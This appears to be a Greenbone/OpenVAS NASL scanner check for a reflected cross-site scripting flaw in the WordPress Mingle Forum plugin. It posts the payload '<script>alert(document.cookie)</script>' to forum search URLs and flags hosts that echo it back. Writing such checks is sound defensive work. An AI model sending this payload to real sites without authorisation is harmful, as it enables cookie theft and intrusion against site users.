CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902665" );
	script_version( "2021-08-06T11:34:45+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-08-06 11:34:45 +0000 (Fri, 06 Aug 2021)" );
	script_tag( name: "creation_date", value: "2012-03-29 16:02:43 +0530 (Thu, 29 Mar 2012)" );
	script_name( "WordPress Mingle Forum Plugin 'search' Parameter XSS Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
web script or HTML in a user's browser session in the context of an affected
site." );
	script_tag( name: "affected", value: "WordPress Mingle Forum Plugin version 1.0.33" );
	script_tag( name: "insight", value: "The flaw is due to an input passed via the 'search' parameter is
not properly sanitized before being returned to the user." );
	script_tag( name: "solution", value: "Upgrade to WordPress Mingle Forum Plugin version 1.0.34." );
	script_tag( name: "summary", value: "This host is installed with WordPress Mingle Forum plugin and is
prone to cross-site scripting vulnerability." );
	script_xref( name: "URL", value: "http://www.1337day.com/exploits/17826" );
	script_xref( name: "URL", value: "http://tunisianseven.blogspot.in/2012/03/mingle-forum-wordpress-plugin-xss.html" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/mingle-forum/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
url = "/?mingleforumaction=search";
postdata = "search_words=<script>alert(document.cookie)</script>" + "&search_submit=Search+forums";
for forum in make_list( "/forum",
	 "/forums",
	 "/le-forum" ) {
	mfReq = NASLString( "POST ", dir, forum, url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	mfRes = http_keepalive_send_recv( port: port, data: mfReq );
	if(IsMatchRegexp( mfRes, "HTTP/1\\.. 200" ) && ContainsString( mfRes, "<script>alert(document.cookie)</script>" )){
		security_message( port );
		exit( 0 );
	}
}

